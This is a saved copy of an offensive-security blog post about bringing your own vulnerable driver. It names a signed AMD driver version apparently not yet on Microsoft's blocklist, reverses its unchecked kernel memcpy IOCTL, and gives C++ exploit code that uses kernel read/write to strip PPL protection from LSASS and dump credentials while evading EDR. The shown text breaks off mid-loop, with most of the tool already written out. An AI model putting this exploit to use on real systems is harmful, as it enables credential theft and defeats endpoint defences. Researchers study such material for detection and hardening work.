@@ -1,0 +1,984 @@
+# https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/
+
+<!DOCTYPE html><!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+--><html lang="en" class=" js ">
+
+  <body class="layout--single wide">
+    
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  
+
+
+
+  <article class="page h-entry" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+    
+    
+    
+
+    <div class="page__inner-wrap">
+      
+        
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>I still remember when Mimikatz dropped in 2011. It was a wild time in offensive security, and a period where a single tool could expose fundamental weaknesses in Windows credential handling and force the entire ecosystem to level up. Features like Protected Process Light (PPL), hardened LSASS protections, and vastly improved ETW telemetry didn’t emerge in a vacuum; they were, in part, Microsoft’s response to researchers openly demonstrating just how broken things were. It was an era defined by deep technical curiosity and creative problem-solving on both sides of the fence, and this was long before AI entered the chat.</p>
+
+<p>Leaping ahead to 2026, the end goal remains the same, but the path to get there has shifted drastically.  What was once a simple matter of tossing mimikatz onto a machine and scraping the freely available, cleartext wdigest creds, has become a more involved process.  Now, we’re faced with a few unique but not all too unfamiliar challenges.  Here are just a few off the top of my head:</p>
+
+<ul>
+  <li>We need to evade or in some cases neutralize EDR ,though I’m of the opinion the latter is much noisier of an option</li>
+  <li>Processes like the coveted <code class="language-plaintext highlighter-rouge">LSASS</code> now have PPL protection and the many usermode tools that can be used to bypass PPL are heavily signatured</li>
+  <li>Many offsec tools are flagged in general and need to be ran in-memory, using many preferred techniques by yours truly such as an in-memory PE loader</li>
+  <li>Vulnerable driver blacklists and HVCI</li>
+</ul>
+
+<p>In cases like the one we’re facing, we traditionally would turn to BYOVD.  Well, I can say not much has changed there, though we will need to get creative in either locating a completely new, undiscovered driver vulnerability.  Or, you could be lazy like me and find a driver that has already been discovered and just use that, albeit a version that hasn’t been caught by the blocklist yet 😸</p>
+
+<p>In today’s post, we will be uncovering the internals of kernel driver vulnerabilities and how to leverage them via the <code class="language-plaintext highlighter-rouge">BYOVD</code> (Bring Your Own Vulnerable Driver) method of attack. We will use kernel access to disable PPL for the LSASS process and then proceed to dump the process to disk, XOR’ing it beforehand so it avoids detection by popular EDR solutions.  Let’s begin!</p>
+
+<h2 id="finding-a-signed-driver-thats-not-on-the-microsoft-blocklist">Finding a Signed Driver that’s not on the Microsoft Blocklist<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#finding-a-signed-driver-thats-not-on-the-microsoft-blocklist" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p>I basically start at <strong>loldrivers.io</strong> or <strong>malshare.com</strong> and download a few drivers to see if they raised a flag concerning the Microsoft Vulnerable Driver Blocklist detection.  Also just FYI, I  have all the necessary security controls enabled beforehand that should prevent this particular driver from loading, such as:</p>
+
+<p><img width="898" height="677" alt="image" src="https://github.com/user-attachments/assets/0640b218-3619-47cc-a4d6-d55ff14c6f2a"><img width="586" height="701" alt="image" src="https://github.com/user-attachments/assets/61ad5e67-a9fd-4e24-9f83-ff0ce8ec423b"><img width="492" height="447" alt="image" src="https://github.com/user-attachments/assets/8a921097-5b96-4631-b0ad-83e287b13137"><img width="528" height="756" alt="image" src="https://github.com/user-attachments/assets/250862e9-05db-4ed3-a7a0-5258d4aff722"></p>
+
+<p>I decided on <strong>PDFWKRNL.sys</strong>, which is vulnerable to a host of vulnerabilities such as a read and write memory primitive, thus making this driver a great candidate for overwriting our PPL value in LSASS to 0x00 effectively neutralizing PPL.  You want to try out different versions of the vulnerable driver.  I cannot stress that enough! Just because the driver is known by microsoft as a known flagged driver, doesn’t mean every working version will be flagged.  That brings me to my next point: If we scroll down this page a bit, you’ll find the version of the driver with sha256 hash value: <strong>6945077a6846af3e4e2f6a2f533702f57e993c5b156b6965a552d6a5d63b7402</strong></p>
+
+<p><a href="https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/f0db5af13c457a299a64cf524c64b042.bin">PDFWKRNL.sys</a></p>
+
+<p><img width="1354" height="754" alt="image" src="https://github.com/user-attachments/assets/8e6aec82-16ce-4b5e-a58f-e6d14a298418"></p>
+
+<p>That’s the driver I am using for this post that is yet to be flagged by Microsoft’s block list 😼  Credit where credit is due.  I learned a lot from hfiref0x’s KDU repo: <a href="https://github.com/hfiref0x/KDU">KDU</a></p>
+
+<p>I tested a few drivers using that tool before I decided to produce my own code to load the vulnerable <strong>PDFWKRNL.sys</strong> driver.  I admittedly borrowed from the previously discovered IOCTL code and symlink name for the driver, but then to better understand how this vulnerability was discovered, I took to binary ninja to explore for myself!</p>
+
+<h2 id="the-inner-workings-of-pdfwkrnlsys">The Inner workings of PDFWKRNL.sys<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#the-inner-workings-of-pdfwkrnlsys" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p><strong>Step 1 — Tracing IOCTL 0x80002014 through the dispatch table</strong></p>
+
+<p>We know from KDU’s previously researched info that the IOCTL code we are concerned with is <strong>0x80002014</strong>.  Let’s start with <strong>sub_140001000</strong>, which calculates both the IOCTL and the function that should be called based on a number of calculations we will explore below.  Long story short: the IOCTL value is not in cleartext when reversing this driver 😸</p>
+
+<p>Let’s start with how did we arrive at the <strong>0x8000</strong> value?  Here’s how it works:</p>
+
+<p>Windows IOCTL codes are structured 32-bit values built by the <strong>CTL_CODE macro</strong>:</p>
+
+<ul>
+  <li>bits 31-16  device type    (<strong>0x8000 here</strong>)</li>
+  <li>bits 15-14  required access</li>
+  <li>bits 13- 2  function code  (the meaningful part)</li>
+  <li>bits  1- 0  transfer method (buffered/direct/neither)</li>
+</ul>
+
+<p>Moreover, we can see this info in Binary Ninja.  That information, including the device name, just so happens to be in cleartext and doesn’t have to be deciphered!</p>
+
+<p><img width="901" height="392" alt="image" src="https://github.com/user-attachments/assets/4a730dcc-cdd6-4ad1-9136-f70d3c356bd3"></p>
+
+<p><strong>So again…How did we arrive at value 0x8000 for the start of our IOCTL code?</strong></p>
+
+<p>Microsoft reserves device types below <strong>0x8000</strong> for official Windows device types (FILE_DEVICE_DISK, FILE_DEVICE_KEYBOARD, FILE_DEVICE_UNKNOWN, etc.).</p>
+
+<p>Third-party vendors (like AMD) must use values <strong>0x8000</strong> and above for their custom device types.  <strong>0x8000</strong> is the most common value used by many vendors for custom/software-only drivers. It’s essentially saying: “This is a vendor-defined device type”.</p>
+
+<p><strong>How about 0x2000 after the 0x8000?</strong></p>
+
+<p>Glad you asked 😺</p>
+
+<p>This value is calculated, borrowing from the two’s complement of the constant in the instruction.  This took me FOREVER to figure out which is kind of embarrassing and humbling for me lol!</p>
+
+<p>The instruction is add eax, 0x7fffe000. Adding a constant is the same as subtracting its two’s complement negation:</p>
+
+<p>~0x7fffe000 + 1
+  = 0x80001fff + 1
+  = 0x80002000</p>
+
+<p><img width="909" height="497" alt="image" src="https://github.com/user-attachments/assets/3908a492-1a62-4810-8cc5-12122602ef19"></p>
+
+<p>So <strong>add eax, 0x7fffe000</strong> in 32-bit arithmetic is identical to <strong>sub eax, 0x80002000</strong></p>
+
+<p>Next, there’s the final 0x14.  How did we arrive at that?  That’s the case value we’re looking for that points to the memory write primitive!</p>
+
+<p><img width="670" height="346" alt="image" src="https://github.com/user-attachments/assets/369b1257-7ce3-4764-bfe4-343883ae12cd"></p>
+
+<p><strong>Why this is a vulnerability?</strong></p>
+
+<p>There is zero validation.  No ProbeForRead/ProbeForWrite, no canonical address check, no bounds check. Any process that can open <strong>\.\PdFwKrnl</strong> gets a ring-0 <strong>memmove</strong> with fully attacker-controlled src, dst, and size:</p>
+
+<ul>
+  <li>Read primitive: dst = usermode buffer, src = any kernel VA → copies kernel memory to userspace</li>
+  <li>Write primitive: dst = any kernel VA, src = usermode payload → overwrites arbitrary kernel memory</li>
+</ul>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1400012</span><span class="n">ae</span>                            <span class="nf">sub_1400016c0</span><span class="p">(</span>
+<span class="mi">1400012</span><span class="n">ae</span>                                <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">MasterIrp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span> 
+<span class="mi">1400012</span><span class="n">ae</span>                                <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">MasterIrp</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">),</span> 
+<span class="mi">1400012</span><span class="n">ae</span>                                <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">MasterIrp</span><span class="p">[</span><span class="mh">0xa</span><span class="p">]);</span>
+<span class="mi">1400012</span><span class="n">b3</span>                            <span class="n">arg2</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>I am forever appreciative of the original research that went into discovering the IOCTL value.  It would have taken me a very long time to discover that on my own, I can assure you 😸  But yeah, that’s the general breakdown on how this driver vulnerability plays out and why it’s a great candidate for BYOVD and removing PPL protection on LSASS.  Now, on to the next best part, the code!</p>
+
+<h2 id="code-for-the-ppl-removal--exploit-harness-for-pdfwkrnlsys">Code for the PPL Removal / Exploit Harness for PDFWKRNL.sys<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#code-for-the-ppl-removal--exploit-harness-for-pdfwkrnlsys" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p>It’s time for the highly anticipated code portion of this post!  Let’s go head and get started.  We will begin with defining the IOCTL value we wish to work with, as well as the 0x48 byte structure which is required for the IOCTL check. the 0x30 in the screenshot below is the buffer check of 0x30 or 48 in decimal, followed by the memcpy/memmove values!</p>
+
+<p><img width="765" height="441" alt="image" src="https://github.com/user-attachments/assets/104c5429-31ca-4b24-b5fe-8d0c6f8bb6d4"></p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mov</span> <span class="nb">r8d</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">+</span><span class="mh">0x28</span><span class="p">]</span>   <span class="c1">; size  ← BufAmdCopy.size   (32-bit read, upper 32 bits of u64 discarded)</span>
+<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>   <span class="c1">; src   ← BufAmdCopy.src</span>
+<span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>   <span class="c1">; dst   ← BufAmdCopy.dst</span>
+<span class="nf">call</span> <span class="nv">sub_1400016c0</span>           <span class="c1">; memmove(dst, src, size)</span>
+</code></pre></div></div>
+
+<p>Microsoft x64 calling convention: <strong>rcx=arg1, rdx=arg2, r8=arg3</strong>.  This is exactly <strong>memmove(dst, src, size)</strong> with all three values coming unmodified from the usermode-supplied buffer. No sanitization between the jne and the call!</p>
+
+<p>Now let’s plug those values into our code:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "psapi.lib")
+</span>
+<span class="c1">// --- AMD PDFW (PdFwKrnl) Specifics ---</span>
+<span class="cp">#define IOCTL_AMDPDFW_MEMCPY 0x80002014 //our IOCTL value
+</span>
+<span class="c1">// This structure MUST be exactly 48 bytes</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_PDFW_MEMCPY</span> <span class="p">{</span>
+    <span class="n">BYTE</span>  <span class="n">Reserved</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>   <span class="c1">// 0x00 - 0x0F</span>
+    <span class="n">PVOID</span> <span class="n">Destination</span><span class="p">;</span>    <span class="c1">// 0x10 &lt;--</span>
+    <span class="n">PVOID</span> <span class="n">Source</span><span class="p">;</span>         <span class="c1">// 0x18 &lt;--</span>
+    <span class="n">PVOID</span> <span class="n">Reserved2</span><span class="p">;</span>      <span class="c1">// 0x20</span>
+    <span class="n">DWORD</span> <span class="n">Size</span><span class="p">;</span>           <span class="c1">// 0x28 &lt;--</span>
+    <span class="n">DWORD</span> <span class="n">Reserved3</span><span class="p">;</span>      <span class="c1">// 0x2C</span>
+<span class="p">}</span> <span class="n">PDFW_MEMCPY</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPDFW_MEMCPY</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Next up, we need to find the kernel offsets for the version of Windows this driver would be running on.  In my case, Windows 11 25h2.  Here are the values I pulled, and I’ll also show how I retrieved them.
+It’s incredibly annoying having to debug in kernel mode, turning on debugging using bcdedit and restarting the machine.  Let’s make life easier for ourselves.  I just reverse engineer <strong>ntoskrnl.exe</strong> and do a static search for the <strong>_EPROCESS</strong> type.  Easy peezy!</p>
+
+<p><img width="816" height="728" alt="image" src="https://github.com/user-attachments/assets/f49f882a-59da-441a-9303-f65396db1731"></p>
+
+<p>Our first two values are clearly visible!  Next, just scroll down a bit to reach ImageFileNameOffset and then ProtectionOffset:</p>
+
+<p><img width="693" height="123" alt="image" src="https://github.com/user-attachments/assets/80216119-ebcd-42f2-8ea1-3f4f763ba9c5"></p>
+
+<p><img width="598" height="105" alt="image" src="https://github.com/user-attachments/assets/f059d358-0d03-4ceb-a2ad-c713277513fe"></p>
+
+<p>Now we just make our own struct to include those values, like so:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">KernelOffsets</span> <span class="p">{</span>
+    <span class="n">ULONG64</span> <span class="n">UniqueProcessIdOffset</span> <span class="o">=</span> <span class="mh">0x1D0</span><span class="p">;</span>
+    <span class="n">ULONG64</span> <span class="n">ActiveProcessLinksOffset</span> <span class="o">=</span> <span class="mh">0x1D8</span><span class="p">;</span>
+    <span class="n">ULONG64</span> <span class="n">ImageFileNameOffset</span> <span class="o">=</span> <span class="mh">0x338</span><span class="p">;</span>
+    <span class="n">ULONG64</span> <span class="n">ProtectionOffset</span> <span class="o">=</span> <span class="mh">0x5FA</span><span class="p">;</span> <span class="c1">// Offset for Build 26200</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Ok that’s the part that a lot of people could use a refresher on.  The next part I’m not going to spend as much time explaining.  We basically setup the memory read and write functions.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hDriver</span> <span class="o">=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">;</span>
+<span class="n">KernelOffsets</span> <span class="n">Offsets</span><span class="p">;</span>
+
+<span class="c1">// --- AMD PDFW Driver Communication ---</span>
+
+<span class="kt">bool</span> <span class="nf">Amd_ReadMemory</span><span class="p">(</span><span class="n">DWORD64</span> <span class="n">Address</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">Buffer</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">Size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">PDFW_MEMCPY</span> <span class="n">request</span><span class="p">;</span>
+    <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">request</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request</span><span class="p">));</span>
+
+    <span class="n">request</span><span class="p">.</span><span class="n">Destination</span> <span class="o">=</span> <span class="n">Buffer</span><span class="p">;</span>           <span class="c1">// Where we want the data (our local buffer)</span>
+    <span class="n">request</span><span class="p">.</span><span class="n">Source</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">Address</span><span class="p">;</span>        <span class="c1">// Where the data is (kernel address)</span>
+    <span class="n">request</span><span class="p">.</span><span class="n">Size</span> <span class="o">=</span> <span class="n">Size</span><span class="p">;</span>
+
+    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">IOCTL_AMDPDFW_MEMCPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">request</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">request</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">bool</span> <span class="nf">Amd_WriteMemory</span><span class="p">(</span><span class="n">DWORD64</span> <span class="n">Address</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">Buffer</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">Size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">PDFW_MEMCPY</span> <span class="n">request</span><span class="p">;</span>
+    <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">request</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request</span><span class="p">));</span>
+
+    <span class="n">request</span><span class="p">.</span><span class="n">Destination</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">Address</span><span class="p">;</span>   <span class="c1">// Where we want to write (kernel address)</span>
+    <span class="n">request</span><span class="p">.</span><span class="n">Source</span> <span class="o">=</span> <span class="n">Buffer</span><span class="p">;</span>                <span class="c1">// What we want to write (our local buffer)</span>
+    <span class="n">request</span><span class="p">.</span><span class="n">Size</span> <span class="o">=</span> <span class="n">Size</span><span class="p">;</span>
+
+    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">IOCTL_AMDPDFW_MEMCPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">request</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">request</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper wrapper for 64-bit reads</span>
+<span class="n">DWORD64</span> <span class="nf">ReadMemoryDWORD64</span><span class="p">(</span><span class="n">DWORD64</span> <span class="n">Address</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">DWORD64</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">Amd_ReadMemory</span><span class="p">(</span><span class="n">Address</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="k">return</span> <span class="n">val</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Next up, we need to setup a function to locate the PsInitialSystemProcess Offset.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONG64</span> <span class="nf">GetSystemEproc</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">ntosBase</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">HMODULE</span> <span class="n">ntos</span> <span class="o">=</span> <span class="n">LoadLibraryExA</span><span class="p">(</span><span class="s">"ntoskrnl.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">DONT_RESOLVE_DLL_REFERENCES</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ntos</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">DWORD64</span> <span class="n">addrInLocal</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntos</span><span class="p">,</span> <span class="s">"PsInitialSystemProcess"</span><span class="p">);</span>
+    <span class="n">DWORD64</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">addrInLocal</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">ntos</span><span class="p">;</span>
+    <span class="n">FreeLibrary</span><span class="p">(</span><span class="n">ntos</span><span class="p">);</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] PsInitialSystemProcess Offset: 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">offset</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">ReadMemoryDWORD64</span><span class="p">(</span><span class="n">ntosBase</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now for the obligatory main function, which includes an argument parameter for our LSASS pid and the file handle to our driver in question:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Usage: "</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">" &lt;Target PID&gt;"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">DWORD</span> <span class="n">targetPid</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">stoul</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+    <span class="c1">// Connect to Driver</span>
+    <span class="n">hDriver</span> <span class="o">=</span> <span class="n">CreateFileW</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">Global</span><span class="se">\\</span><span class="s">PdFwKrnl"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hDriver</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"[-] Failed to open handle to PdFwKrnl. Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[+] Connected to AMD PDFW Driver."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We’re close now, basically at the home stretch!  😸  We just need to locate the kernel base <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> and the <strong>EPROCESS</strong> address.  Then, we need cycle through all the processes and locate <strong>LSASS</strong>!</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">// Get Kernel Base</span>
+ <span class="n">ULONG64</span> <span class="n">ntosBase</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+ <span class="n">DWORD</span> <span class="n">cb</span><span class="p">;</span>
+ <span class="k">if</span> <span class="p">(</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cb</span><span class="p">))</span> <span class="n">ntosBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+ <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] ntoskrnl.exe Base: 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">ntosBase</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+
+ <span class="n">ULONG64</span> <span class="n">systemEproc</span> <span class="o">=</span> <span class="n">GetSystemEproc</span><span class="p">(</span><span class="n">ntosBase</span><span class="p">);</span>
+ <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">systemEproc</span><span class="p">)</span> <span class="p">{</span>
+     <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"[-] Failed to read System EPROCESS. Communication failed."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+     <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+ <span class="p">}</span>
+ <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[+] System EPROCESS: 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">systemEproc</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+
+ <span class="c1">// Iterate Process List</span>
+ <span class="n">DWORD64</span> <span class="n">listHead</span> <span class="o">=</span> <span class="n">systemEproc</span> <span class="o">+</span> <span class="n">Offsets</span><span class="p">.</span><span class="n">ActiveProcessLinksOffset</span><span class="p">;</span>
+ <span class="n">DWORD64</span> <span class="n">currentFlink</span> <span class="o">=</span> <span class="n">ReadMemoryDWORD64</span><span class="p">(</span><span class="n">listHead</span><span class="p">);</span>
+ <span class="kt">bool</span> <span class="n">found</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+ <span class="k">while</span> <span class="p">(</span><span class="n">currentFlink</span> <span class="o">!=</span> <span class="n">listHead</span> <span class="o">&amp;&amp;</span> <span class="n">currentFlink</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+     <span class="n">DWORD64</span> <span class="n">currentEproc</span> <span class="o">=</span> <span class="n">currentFlink</span> <span class="o">-</span> <span class="n">Offsets</span><span class="p">.</span><span class="n">ActiveProcessLinksOffset</span><span class="p">;</span>
+     <span class="n">DWORD64</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">ReadMemoryDWORD64</span><span class="p">(</span><span class="n">currentEproc</span> <span class="o">+</span> <span class="n">Offsets</span><span class="p">.</span><span class="n">UniqueProcessIdOffset</span><span class="p">);</span>
+
+     <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="n">targetPid</span><span class="p">)</span> <span class="p">{</span>
